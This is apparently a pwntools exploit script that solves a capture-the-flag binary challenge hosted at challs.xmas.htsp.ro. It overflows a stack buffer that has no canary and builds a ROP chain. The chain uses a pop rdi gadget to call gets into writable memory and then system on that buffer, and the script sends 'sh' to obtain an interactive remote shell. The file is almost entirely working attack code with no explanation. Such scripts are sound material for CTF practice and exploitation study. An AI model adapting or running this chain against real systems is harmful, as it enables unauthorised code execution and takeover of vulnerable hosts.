from pwn import *

"""
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
"""
p = remote("challs.xmas.htsp.ro", 2001)
chalELF = ELF("./chall")


"""
0x00000000004008e3: pop rdi; ret; 
0x00000000004008e1: pop rsi; pop r15; ret; 
"""

pop_rdi = p64(0x00000000004008e3)

rop = b''
rop += cyclic(cyclic_find("saaataaauaaava"))
rop += pop_rdi
rop += p64(0x601000)
rop += p64(chalELF.symbols['gets'])
rop += pop_rdi
rop += p64(0x601000)
rop += p64(chalELF.symbols['system'])

p.sendline(rop)
p.sendline("sh")

p.interactive()